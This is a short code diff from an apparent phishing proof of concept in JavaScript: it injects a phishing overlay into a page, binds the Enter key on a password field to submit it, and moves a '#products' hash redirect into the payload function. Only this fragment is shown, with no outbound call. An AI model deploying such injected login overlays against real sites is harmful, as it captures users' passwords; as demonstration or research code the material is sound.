@@ -80,6 +80,7 @@ function execPayld() {
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
+  document.location.href = document.location.href.split('#')[0] + '#products';
   document.getElementById('password').addEventListener('keyup', event => {
     if(event.key !== 'Enter') return;
     document.getElementById('okbutton').click();
@@ -106,7 +107,6 @@ function checkDOM() {
   }
 }
 window.addEventListener('load', function() {
-  window.location.href = window.location.href.split('#')[0] + '#products';
   checkDOM();
 });
 function startPoC() {
